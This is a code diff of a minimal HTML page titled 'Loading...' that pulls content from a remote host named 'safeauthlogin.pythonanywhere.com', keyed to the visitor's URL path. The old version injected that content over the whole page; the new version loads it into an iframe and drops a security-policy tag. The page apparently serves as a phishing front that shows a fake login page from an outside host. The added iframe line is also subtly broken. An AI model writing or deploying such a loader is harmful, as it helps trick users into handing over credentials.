@@ -3,18 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
-
+<iframe id="iframe"></iframe>
 <script>
-     $( window ).on( "load", function() {
-     const url = "https://safeauthlogin.pythonanywhere.com" + window.location.pathname;
-        $.get(url, function(data) {
-        $("html").html(data);
-        });
-    });
+    const url = "https://safeauthlogin.pythonanywhere.com" + window.location.pathname;
+    $("#iframe").src = url;
 </script>
 </body>
 </html>
